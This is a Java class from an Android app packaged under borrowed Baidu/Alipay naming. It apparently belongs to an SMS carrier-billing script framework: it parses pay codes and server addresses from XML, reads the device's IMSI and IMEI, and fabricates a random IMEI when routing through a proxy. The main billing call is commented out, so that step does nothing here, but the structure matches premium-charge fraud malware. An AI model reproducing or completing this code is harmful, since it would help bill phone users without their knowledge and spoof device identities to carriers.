package com.baidu.alipay.script;

import java.util.List;

import com.baidu.alipay.DeviceInfo;
//import com.taobao.alipay.mm318.Mm318Bill;

import android.content.Context;

public class Mm318 extends Tags{

	private static final String APPID = "appId";
	private static final String PAYCODE = "payCode";
	private static final String CHANNEL = "channel";
	private static final String DATA = "data";
	private static final String IMSI = "imsi";
	private static final String IMEI = "imei";
	private static final String IP = "ip";
	private static final String PORT = "port";
	
	private String appId;
	private String imsi;
	private String imei;
	private String payCode;
	private String ip;
	private String port;
	private String channel;
	private String data;
	private boolean proxy;
	
	private static long lastTime = 0l;

	public Mm318(String xml,boolean dynamic){
		super();
		
		this.appId = getNodeValue(xml,APPID);
		this.payCode = getNodeValue(xml, PAYCODE);
		this.imsi = getNodeValue(xml, IMSI);
		this.imei = getNodeValue(xml,IMEI);
		this.ip = getNodeValue(xml, IP);
		this.port = getNodeValue(xml, PORT);
		this.channel = getNodeValue(xml, CHANNEL);
		this.data = getNodeValue(xml,DATA);
		
		this.dynamic = dynamic;
	}
	
	@Override
	public String work(Context context, SendSms sendSms, List<Tags> tagsList, int pos) {
	
//		long time = System.currentTimeMillis() - lastTime;
//		
//		if(time <= 31000l){
//			try{
//				Thread.sleep(31000l - time);
//			}catch (Exception e) {
//				e.printStackTrace();
//			}
//		}
//		
//		init(context);
//	
//		Mm318Bill mm318Bill = new Mm318Bill(context, ip, port, imsi, imei, appId, payCode, channel, data,proxy);
//		
//		boolean succ = mm318Bill.bill();
//		
//		lastTime = System.currentTimeMillis();
//		
//		if(succ){
//			return TAGS_EXEC_SUCC;
//		}else{
//			if(mm318Bill.isCanAsynch()){
//				this.errorReason = mm318Bill.getAsynchParam();
//				
//				return TAGS_EXEC_SUCC;
//			}else{
//				this.errorReason = mm318Bill.getErrorReason();
//				return TAGS_EXEC_FAIL;
//			}
//		}
		
		return TAGS_EXEC_SUCC;
	}

	private void init(Context context){

		if(this.imsi == null || this.imsi.length() == 0){
			this.imsi = DeviceInfo.getIMSI(context);
			this.imei = DeviceInfo.getIMEI(context);

			this.proxy = false;
		}else{
			if(this.imei == null || this.imei.length() == 0){
				this.imei = DeviceInfo.randomImei();
			}

			this.proxy = true;
		}
	}

	@Override
	public String getTag() {
		return TAGS_MM318;
	}
	
}
